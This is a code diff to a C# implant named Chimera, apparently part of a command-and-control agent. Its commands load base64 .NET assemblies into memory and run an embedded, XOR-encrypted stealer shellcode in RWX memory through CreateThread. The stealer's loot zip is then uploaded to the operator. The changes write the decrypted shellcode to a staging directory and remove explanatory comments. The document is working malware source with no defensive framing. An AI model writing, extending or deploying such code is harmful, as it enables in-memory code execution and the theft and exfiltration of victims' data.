@@ -8,7 +8,8 @@ namespace Chimera.Commands
 {
     // inject_assembly <base64_assembly> — load a .NET assembly from base64 and call its Run() method
     // run_stealer                        — decrypt embedded stealer_enc resource (XOR 0x41),
-    //                                      allocate RWX, run in thread, wait for loot zip, upload it
+    //                                      write to staging dir, allocate RWX, run in thread,
+    //                                      wait for loot zip, upload it
     public static class InjectAssembly
     {
         [DllImport("kernel32.dll", SetLastError = true)]
@@ -29,17 +30,15 @@ namespace Chimera.Commands
         private const uint MEM_RESERVE = 0x2000;
         private const uint PAGE_EXECUTE_READWRITE = 0x40;
 
-        private const string LootPath = @"C:\Users\Public\stealer_loot.zip";
-        private const int    PollSec  = 120;
+        private static readonly string LootPath  = Path.Combine(Staging.Dir, "stealer_loot.zip");
+        private static readonly string StealerBin = Path.Combine(Staging.Dir, "stealer.bin");
+        private const int PollSec = 120;
 
-        // Entry point used by Tasking.cs for both commands
         public static string Execute(string parameters, string taskID, string callbackUUID)
         {
-            // run_stealer path — no parameters needed (stealer_enc embedded at build time)
             if (string.IsNullOrEmpty(parameters) || parameters.Trim() == "run_stealer")
                 return RunStealer(taskID, callbackUUID);
 
-            // inject_assembly path — parameter is base64-encoded .NET assembly
             return InjectDotnet(parameters);
         }
 
@@ -51,7 +50,6 @@ namespace Chimera.Commands
                 byte[] asmBytes = Convert.FromBase64String(base64Asm.Trim());
                 Assembly asm    = Assembly.Load(asmBytes);
 
-                // Find a public static Run() or Main() entry point
                 MethodInfo entry = null;
                 foreach (Type t in asm.GetTypes())
                 {
@@ -61,7 +59,6 @@ namespace Chimera.Commands
                     entry = t.GetMethod("Main",
                         BindingFlags.Public | BindingFlags.Static, null, Type.EmptyTypes, null);
                     if (entry != null) break;
-                    // Accept Main(string[]) too
                     entry = t.GetMethod("Main",
                         BindingFlags.Public | BindingFlags.Static, null,
                         new[] { typeof(string[]) }, null);
@@ -75,7 +72,6 @@ namespace Chimera.Commands
                     ? new object[] { new string[0] }
                     : null;
 
-                // Redirect stdout so we can capture output
                 var sw  = new System.IO.StringWriter();
                 var old = Console.Out;
                 Console.SetOut(sw);
@@ -98,9 +94,11 @@ namespace Chimera.Commands
         {
             try
             {
-                // 1. Load embedded resource "stealer_enc" (added via /res:stealer_enc,stealer_enc)
-                var thisAsm  = Assembly.GetExecutingAssembly();
-                var stream   = thisAsm.GetManifestResourceStream("stealer_enc");
+                Staging.EnsureDir();
+
+                // 1. Load embedded resource stealer_enc
+                var thisAsm = Assembly.GetExecutingAssembly();
+                var stream  = thisAsm.GetManifestResourceStream("stealer_enc");
                 if (stream == null)
                     return "[error] Resource 'stealer_enc' not found in assembly.";
 
@@ -113,7 +111,10 @@ namespace Chimera.Commands
                 for (int i = 0; i < enc.Length; i++)
                     shellcode[i] = (byte)(enc[i] ^ 0x41);
 
-                // 3. Allocate RWX memory
+                // 3. Write decrypted shellcode to staging dir for manual extraction
+                File.WriteAllBytes(StealerBin, shellcode);
+
+                // 4. Allocate RWX memory and copy shellcode in
                 IntPtr mem = VirtualAlloc(
                     IntPtr.Zero,
                     (UIntPtr)shellcode.Length,
@@ -125,7 +126,7 @@ namespace Chimera.Commands
 
                 Marshal.Copy(shellcode, 0, mem, shellcode.Length);
 
-                // 4. Create thread and let it run
+                // 5. Create thread
                 uint tid;
                 IntPtr hThread = CreateThread(
                     IntPtr.Zero, UIntPtr.Zero, mem, IntPtr.Zero, 0, out tid);
@@ -133,7 +134,7 @@ namespace Chimera.Commands
                 if (hThread == IntPtr.Zero)
                     return "[error] CreateThread failed: " + Marshal.GetLastWin32Error();
 
-                // 5. Poll up to PollSec seconds for loot zip to appear
+                // 6. Poll up to PollSec seconds for loot zip
                 bool found = false;
                 for (int i = 0; i < PollSec; i++)
                 {
@@ -145,17 +146,16 @@ namespace Chimera.Commands
                     return "[error] Stealer ran but loot zip not found at " + LootPath
                            + " within " + PollSec + " seconds.";
 
-                // 6. Upload loot — reuse native Upload command
-                // Upload.Execute expects "local_path [remote_filename]"
+                // 7. Upload loot
                 string uploadResult = Upload.Execute(
                     LootPath + " stealer_loot.zip", taskID, callbackUUID);
 
-                // 7. Clean up loot from disk
+                // 8. Clean up loot (keep stealer.bin for manual use)
                 try { File.Delete(LootPath); } catch { }
 
                 return "[+] Stealer completed.\n" +
-                       "    Loot: " + LootPath + "\n" +
-                       "    Upload result: " + uploadResult;
+                       "    Shellcode: " + StealerBin + "\n" +
+                       "    Loot uploaded: " + uploadResult;
             }
             catch (Exception ex)
             {
